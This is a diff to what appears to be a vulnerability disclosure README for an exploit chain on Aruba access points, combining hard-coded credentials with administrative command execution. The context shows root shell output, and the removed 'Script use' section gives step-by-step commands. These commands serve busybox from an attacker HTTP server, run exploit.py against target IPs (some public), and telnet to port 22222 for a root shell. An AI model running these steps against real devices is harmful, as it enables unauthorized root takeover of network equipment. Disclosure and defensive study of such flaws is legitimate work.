@@ -395,7 +395,6 @@ Combined with this information, you can eventually execute arbitrary system comm
  (hard-coded login credentials vulnerability + arbitrary administrative command execution vulnerability after login)<br>
 .<br>
 The command I execute in the auto_sw_funcs file is:<br>
-This command can be modified in the exploit_httpserver.py file<br>
 
 ```
 exploit_cmd = '''
@@ -408,38 +407,3 @@ This command will open a telnetd port within the device, enter the device and ru
 /tmp # /tmp/busybox id
 uid=0(root) gid=0(root)
 ```
-
-## 5 Script use
-
-**Step 1:**  Open a new command line terminal under the exploit file and execute the following command
-
-```
-python exploit_httpserver.py --exploit_http_server_ip=10.0.4.54
-```
-
-exploit_http_server_ip is the ip of the http server server,the value must be a server address accessible to the public network<br>
-This step is to start an http server server with a slow transfer rate<br>
-**Step 2:**  Open a new command line terminal under the exploit file and execute the following command
-
-```
-python3 -m http.server 8888
-```
-
-This step is to start an http server server for the device to download the busybox file<br>
-**Step 3:**  Open a new command line terminal under the exploit file and execute the following command
-```
-python exploit.py --aruba_ap_ip=10.0.4.102 --action=exploit --exploit_http_server_ip=10.0.4.54
-python exploit.py --aruba_ap_ip=118.163.110.217 --action=exploit --exploit_http_server_ip=123.60.137.236
-```
-
-aruba_ap_ip indicates the ip address of the target device to be exploited<br>
-exploit_http_server_ip is the ip of the http server server<br>
-action defaults to exploit<br>
-Wait quietly for exploit.py to finish executing, then proceed to step 4<br>
-**Step 4:** Open a new command line terminal under the exploit file and execute the following command
-
-```
-telnet (aruba_ap_ip) 22222
-```
-
-This command can be used to log into the root shell of the target device.
